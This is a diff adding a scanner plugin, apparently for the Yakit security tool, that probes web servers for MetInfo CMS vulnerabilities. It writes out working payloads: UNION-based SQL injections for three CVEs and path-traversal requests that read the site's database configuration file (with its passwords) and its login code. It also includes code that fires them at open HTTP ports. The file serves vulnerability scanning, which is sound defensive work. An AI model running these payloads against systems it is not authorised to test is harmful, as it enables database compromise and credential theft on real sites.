@@ -1,0 +1,143 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+
+PacketGet = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+PacketPost = `POST /admin/?n=language&c=language_general&a=doExportPack HTTP/1.1
+Host: {{params(target)}}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+{{params(payload)}}
+`
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+//填充对应的漏洞检测规则
+
+// 41557 43952
+
+addRule(PacketGet,`/admin/?n=product&c=product_admin&a=dopara&app_type=shop&id=1%20union%20SELECT%201,2,3,41557*43952,5,6,7%20limit%205,1%20%23`,func(rsp,header,body){
+    if rsp.StatusCode == 200  && str.MatchAllOfSubString(body, `1826513264`){
+        return true
+    }
+    return false
+},"sql注入",`metinfo-cve-2019-16996-sqli`,"high","https://y4er.com/post/metinfo7-sql-tips/#sql-injection-1")
+
+
+addRule(PacketGet,`/admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+41557*43952,1--+&site=admin`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `1826513264`){
+        return true
+    }
+    return false
+},"sql注入",`metinfo-cve-2019-17418-sqli`,"high","https://github.com/evi1code/Just-for-fun/issues/2")
+
+
+addRule(PacketGet,`/include/thumb.php?dir=http/.....///.....///config/config_db.php`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `con_db_pass`,`con_db_host`,`con_db_name`){
+        return true
+    }
+    return false
+},"文件包含",`metinfo-file-read`,"high","https://www.cnblogs.com/-qing-/p/10889467.html")
+
+
+addRule(PacketGet,`/include/thumb.php?dir=http\..\admin\login\login_check.php`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `<?php`,`login_met_cookie($metinfo_admin_name);`){
+        return true
+    }
+    return false
+},"文件包含",`metinfo-lfi-cnvd-2018-13393`,"high","https://paper.seebug.org/676/")
+
+
+
+
+addRule(PacketPost,`appno= 1 union SELECT 41557*43952,1&editor=cn&site=web`,func(rsp,header,body){
+    if rsp.StatusCode == 200 &&  str.MatchAllOfSubString(body, `1826513264`){
+        return true
+    }
+    return false
+},"sql注入",`metinfo-cve-2019-16997-sqli`,"high","https://y4er.com/post/metinfo7-sql-tips/#sql-injection-2")
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+ 
+    //漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
